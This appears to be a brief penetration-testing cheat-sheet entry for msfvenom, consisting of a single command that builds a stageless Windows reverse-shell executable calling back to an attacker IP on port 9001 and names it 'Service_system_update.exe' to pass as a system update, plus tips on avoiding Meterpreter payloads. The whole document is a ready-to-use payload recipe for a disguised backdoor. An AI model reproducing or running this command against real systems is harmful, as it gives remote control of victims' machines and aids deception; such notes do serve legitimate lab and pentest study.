# msfvenom

> Windows reverse shell; defaults to x86 ie 32bit
```
msfvenom -p windows/shell_reverse_tcp lhost=<MY_IP> lport=9001 -f exe > Service_system_update.exe
```
- avoid the meterpreter payloads, they require metasploit handler to catch them
- note the _ separating the terms; this indicates STAGELESS payloads ie, no metasploit needed to catch
